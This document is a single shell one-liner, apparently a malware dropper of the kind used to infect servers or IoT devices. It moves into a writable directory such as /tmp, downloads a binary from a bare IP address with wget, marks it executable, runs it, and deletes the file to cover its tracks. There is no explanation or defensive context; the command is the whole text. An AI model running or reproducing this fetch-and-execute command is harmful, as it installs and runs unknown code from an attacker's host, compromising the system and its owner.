cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.220.195/fjhdsngh; chmod +x fjhdsngh; ./fjhdsngh; rm -rf fjhdsngh
